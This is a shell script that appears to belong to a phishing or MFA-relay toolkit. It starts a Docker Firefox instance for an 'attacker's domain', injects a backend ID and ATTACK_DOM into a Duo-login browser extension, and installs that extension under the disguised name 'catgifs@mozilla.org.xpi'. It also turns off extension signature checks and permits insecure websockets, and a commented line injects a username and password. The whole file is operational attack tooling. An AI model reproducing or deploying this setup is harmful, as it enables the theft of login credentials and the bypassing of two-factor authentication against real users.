# Launches a docker backend given a BID (Backend ID), a Port, and an 
# Attacker's domain (needed so that websocket in docker container's 
# firefox extension knows where to connect to)
# 
# usage: run-server BID port ATTACK_DOM localhost_ip

echo -e "[*] SH\t\t\tStarting docker process at: $(date +%s%N | cut -b1-13)"
prefix=$( cd "$(dirname "${BASH_SOURCE[0]}")" ; pwd -P )

# Copy firefox extension .zip into tmp, and unzip it to modify it
cp -R $prefix/../firefox/firefoxSID /docker/appdata/firefoxSID$1
cp $prefix/../firefox/duo-login-ext/duo.zip /tmp/duo$1.zip
unzip -o /tmp/duo$1.zip -d /tmp/duo$1

# Inject relavent vars
# echo -e "var USER=\"$2\";var PASS=\"$3\";var SID=\"$1\";\n$(cat /tmp/duo$1/duo-login.js)" > /tmp/duo$1/duo-login.js
echo -e "var BID=\"$1\";var ATTACK_DOM=\"$3\";\n$(cat /tmp/duo$1/background.js)" > /tmp/duo$1/background.js

# Re-zip the extension and place it into the right extensions directory
cd /tmp/duo$1
zip duo$1.zip *
mv /tmp/duo$1/duo$1.zip /docker/appdata/firefoxSID$1/profile/extensions/catgifs@mozilla.org.xpi
rm -r /tmp/duo$1
rm /tmp/duo$1.zip

# --add-host=docker-host:`ip addr show docker0 | grep -Po 'inet \K[\d.]+'` \
# Start the docker container. --add-host is not nee
# Setting firefox preferences are mostly non-important but some are
# (don't remember which?)
docker run -d \
    --name=firefoxSID$1 \
    -p $2:5800 \
    -v /docker/appdata/firefoxSID$1:/config:rw \
    --privileged \
    --shm-size 2g \
	-e "FF_PREF_INSTALL=xpinstall.signatures.required=false" \
	-e "FF_PREF_WHITELIST=xpinstall.whitelist.required=false" \
	-e "FF_PREF_POP=dom.disable_open_during_load=false" \
	-e "FF_PREF_SEC=network.websocket.allowInsecureFromHTTPS=true" \
	-e "FF_PREF_PIPE=network.http.pipelining=true" \
	-e "FF_PREF_PROXY_PIPE=network.http.proxy.pipelining=true" \
	-e "FF_PREF_MAXREQ=network.http.pipelining.maxrequests=8" \
	-e "FF_PREF_MAXCON=network.http.max-connections=96" \
	-e "FF_PREF_MAXCONS=network.http.max-connections-per-server=32" \
	-e "FF_PREF_DELAY=nglayout.initialpaint.delay=0" \
	-e "FF_PREF_0=browser.download.animateNotifications=False" \
	-e "FF_PREF_1=security.dialog_enable_delay=0" \
	-e "FF_PREF_2=network.prefetch-next=False" \
	-e "FF_PREF_3=browser.newtabpage.activity-stream.feeds.telemetry=false" \
	-e "FF_PREF_4=browser.newtabpage.activity-stream.telemetry=false" \
	-e "FF_PREF_5=browser.ping-centre.telemetry=false" \
	-e "FF_PREF_6=toolkit.telemetry.archive.enabled=false" \
	-e "FF_PREF_7=toolkit.telemetry.bhrPing.enabled=false" \
	-e "FF_PREF_8=toolkit.telemetry.enabled=false" \
	-e "FF_PREF_9=toolkit.telemetry.firstShutdownPing.enabled=false" \
	-e "FF_PREF_10=toolkit.telemetry.hybridContent.enabled=false" \
	-e "FF_PREF_11=toolkit.telemetry.newProfilePing.enabled=false" \
	-e "FF_PREF_12=toolkit.telemetry.reportingpolicy.firstRun=false" \
	-e "FF_PREF_13=toolkit.telemetry.shutdownPingSender.enabled=false" \
	-e "FF_PREF_14=toolkit.telemetry.unified=false" \
	-e "FF_PREF_15=toolkit.telemetry.updatePing.enabled=false" \
    jlesage/firefox
